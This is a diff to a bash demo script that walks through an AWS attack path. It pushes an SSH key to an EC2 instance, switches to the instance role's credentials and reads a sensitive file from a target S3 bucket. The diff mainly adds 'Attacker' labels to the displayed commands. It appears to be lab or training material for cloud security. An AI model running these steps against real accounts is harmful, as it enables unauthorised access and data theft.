@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -112,7 +114,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -124,7 +126,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -132,7 +134,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"
 echo "Attempting to access bucket: $TARGET_BUCKET"
-show_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
+show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -143,7 +145,7 @@ echo ""
 # Step 5: Discover target EC2 instance
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
 echo "Listing EC2 instances with their attached IAM roles..."
-show_cmd aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output text"
 INSTANCE_INFO=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -207,7 +209,7 @@ echo -e "${YELLOW}The public key is valid for 60 seconds after pushing.${NC}"
 echo ""
 
 # Get the availability zone of the instance (required for SendSSHPublicKey)
-show_cmd aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region $AWS_REGION --instance-ids $INSTANCE_ID --query 'Reservations[0].Instances[0].Placement.AvailabilityZone' --output text"
 AVAILABILITY_ZONE=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -219,7 +221,7 @@ echo "Pushing SSH public key to instance: $INSTANCE_ID"
 echo ""
 
 # Push the public key
-show_attack_cmd aws ec2-instance-connect send-ssh-public-key --region $AWS_REGION --instance-id $INSTANCE_ID --instance-os-user ec2-user --availability-zone $AVAILABILITY_ZONE --ssh-public-key file://${SSH_KEY_FILE}.pub
+show_attack_cmd "Attacker" "aws ec2-instance-connect send-ssh-public-key --region $AWS_REGION --instance-id $INSTANCE_ID --instance-os-user ec2-user --availability-zone $AVAILABILITY_ZONE --ssh-public-key file://${SSH_KEY_FILE}.pub"
 aws ec2-instance-connect send-ssh-public-key \
     --region $AWS_REGION \
     --instance-id $INSTANCE_ID \
@@ -280,7 +282,7 @@ export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION="$AWS_REGION"
 
 # Verify new identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 echo -e "${GREEN}✓ Now using extracted EC2 bucket role credentials${NC}\n"
@@ -292,7 +294,7 @@ echo "Target bucket: $TARGET_BUCKET"
 echo ""
 
 echo "Verifying we don't have direct access from starting user first..."
-echo "Temporarily switching to starting user credentials..."
+echo "Temporarily switching to starting user credentials for required permissions..."
 
 # Save extracted credentials
 EXTRACTED_ACCESS_KEY_ID="$AWS_ACCESS_KEY_ID"
@@ -305,13 +307,13 @@ export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
 unset AWS_SESSION_TOKEN
 export AWS_REGION="$AWS_REGION"
 
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 STARTING_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $STARTING_IDENTITY"
 
 echo ""
 echo "Attempting to list bucket as starting user (should fail)..."
-show_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
+show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION &> /dev/null; then
     echo -e "${YELLOW}⚠ Starting user has bucket access already (unexpected)${NC}"
 else
@@ -327,7 +329,7 @@ export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_ACCESS_KEY"
 export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION="$AWS_REGION"
 
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $NEW_IDENTITY"
 echo ""
@@ -338,7 +340,7 @@ echo -e "${BLUE}========================================${NC}"
 echo ""
 
 echo "Listing bucket contents..."
-show_attack_cmd aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION
+show_attack_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION"
 if aws s3 ls s3://$TARGET_BUCKET --region $AWS_REGION; then
     echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}"
 else
@@ -348,7 +350,7 @@ fi
 
 echo ""
 echo "Reading sensitive data file..."
-show_attack_cmd aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION
+show_attack_cmd "Attacker" "aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION"
 if aws s3 cp s3://$TARGET_BUCKET/sensitive-data.txt - --region $AWS_REGION; then
     echo -e "\n${GREEN}✓ Successfully read sensitive data!${NC}"
     echo -e "${GREEN}✓ BUCKET ACCESS ACHIEVED${NC}"
